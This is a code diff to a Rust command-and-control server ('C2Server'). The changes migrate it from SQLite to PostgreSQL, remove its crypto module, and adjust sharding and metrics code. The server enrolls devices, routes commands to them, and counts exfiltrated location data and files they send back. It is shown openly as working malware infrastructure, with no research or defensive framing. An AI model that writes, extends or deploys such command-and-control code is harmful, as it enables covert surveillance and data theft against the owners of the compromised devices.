@@ -4,7 +4,7 @@ use dashmap::DashMap;
 use futures::stream::{SplitSink, SplitStream};
 use futures::{SinkExt, StreamExt};
 use serde::{Deserialize, Serialize};
-use sqlx::sqlite::SqlitePool;
+use sqlx::PgPool;
 use std::sync::Arc;
 use tokio::net::{TcpListener, TcpStream};
 use tokio::sync::RwLock;
@@ -13,7 +13,6 @@ use tracing::{debug, error, info, warn};
 use uuid::Uuid;
 use warp::Filter;
 
-mod crypto;
 mod device_registry;
 mod command_queue;
 mod session;
@@ -23,7 +22,6 @@ mod scale_handler;
 use device_registry::DeviceRegistry;
 use command_queue::CommandQueue;
 use session::{Session, SessionManager};
-use crypto::{SessionCrypto, KeyDerivation};
 
 // ============================================================================
 // TYPES
@@ -100,7 +98,7 @@ impl DeviceConnection {
 // ============================================================================
 
 pub struct C2Server {
-    db: SqlitePool,
+    db: PgPool,
     device_registry: Arc<DeviceRegistry>,
     command_queue: Arc<CommandQueue>,
     session_manager: Arc<SessionManager>,
@@ -110,7 +108,7 @@ pub struct C2Server {
 
 impl C2Server {
     pub async fn new(db_url: &str) -> Result<Self> {
-        let db = SqlitePool::connect(db_url).await?;
+        let db = PgPool::connect(db_url).await?;
         sqlx::query_scalar::<_, i32>("SELECT 1").fetch_one(&db).await?;
         info!("Connected to database: {}", db_url);
 
@@ -309,7 +307,7 @@ impl C2Server {
                 self.metrics.record_location_received();
             }
             "file" => {
-                self.metrics.record_file_received();
+                self.metrics.record_file_received(0u64);
             }
             _ => {
                 debug!("Unknown exfil data type: {}", data_type);
@@ -335,15 +333,16 @@ async fn main() -> Result<()> {
         .init();
 
     // Initialize database
-    let db_url = "sqlite:///tmp/c2.db?mode=rwc";
-    let pool = SqlitePool::connect(db_url).await?;
-    sqlx::migrate!("./migrations").run(&pool).await?;
+    let db_url = std::env::var("DATABASE_URL")
+        .unwrap_or_else(|_| "postgres://c2:c2@localhost:5432/c2".to_string());
+    let pool = PgPool::connect(&db_url).await?;
+    // Migrations are run by the infra setup script; omit compile-time macro here.
 
     // Scale configuration from environment
     let num_shards = std::env::var("C2_SHARDS")
         .ok()
         .and_then(|v| v.parse::<u8>().ok())
-        .unwrap_or_else(|| num_cpus::get() as u8);
+        .unwrap_or_else(|| std::thread::available_parallelism().map_or(4, |n| n.get()) as u8);
     let max_connections = std::env::var("C2_MAX_CONNECTIONS")
         .ok()
         .and_then(|v| v.parse::<usize>().ok())
@@ -357,7 +356,7 @@ async fn main() -> Result<()> {
 
     // Also create legacy C2 server for DB/registry operations
     // (scale_handler handles raw WS, C2Server handles enrollment + command routing)
-    let server = Arc::new(C2Server::new(db_url).await?);
+    let server = Arc::new(C2Server::new(&db_url).await?);
 
     // Prometheus metrics on :9090
     let scale_metrics = Arc::new(scale_handler::ScaleMetrics::new());
@@ -376,9 +375,9 @@ async fn main() -> Result<()> {
         info!("Metrics endpoint on 0.0.0.0:9090/metrics");
         let metrics_filter = warp::path!("metrics")
             .map(move || scale_metrics_warp.export_prometheus());
-        warp::serve(metrics_filter)
-            .bind_with_graceful_shutdown(([0, 0, 0, 0], 9090), async {})
-            .await;
+        let (_, srv) = warp::serve(metrics_filter)
+            .bind_with_graceful_shutdown(([0, 0, 0, 0], 9090), async {});
+        srv.await;
     });
 
     // Launch sharded acceptors — SO_REUSEPORT for OS-level load balancing
